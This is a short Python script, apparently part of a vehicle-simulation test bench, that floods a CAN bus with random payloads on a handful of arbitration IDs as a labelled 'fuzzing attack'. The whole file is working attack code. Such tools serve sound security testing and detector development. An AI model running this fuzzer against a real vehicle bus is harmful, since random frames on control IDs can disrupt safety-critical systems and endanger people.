import time
import random
import can
import os
import sys

sys.path.append(os.path.join(os.path.dirname(__file__), "..", "vehicle-sim"))
from can_bus_utils import get_can_bus

def run_fuzzing_attack(duration=5, delay=0.01):
    """Sends random payloads on random arbitration IDs to fuzz the CAN bus network."""
    bus = get_can_bus()
    print(f"[Attack Injector] Launching Fuzzing Attack (duration={duration}s)...")
    start_t = time.time()
    count = 0
    
    valid_ids = [0x0C4, 0x1A0, 0x2B0, 0x300, 0x450, 0x7FF]
    
    while time.time() - start_t < duration:
        arb_id = random.choice(valid_ids)
        length = random.randint(1, 8)
        payload = bytes([random.randint(0, 255) for _ in range(length)])
        msg = can.Message(arbitration_id=arb_id, data=payload, is_extended_id=False)
        try:
            bus.send(msg)
            count += 1
        except Exception as e:
            print(f"[Attack Injector Error] Fuzzing send failure: {e}")
        time.sleep(delay)
        
    print(f"[Attack Injector] Fuzzing Attack completed. Sent {count} fuzzed frames.")
    return count

if __name__ == "__main__":
    dur = float(sys.argv[1]) if len(sys.argv) > 1 else 5.0
    run_fuzzing_attack(duration=dur)
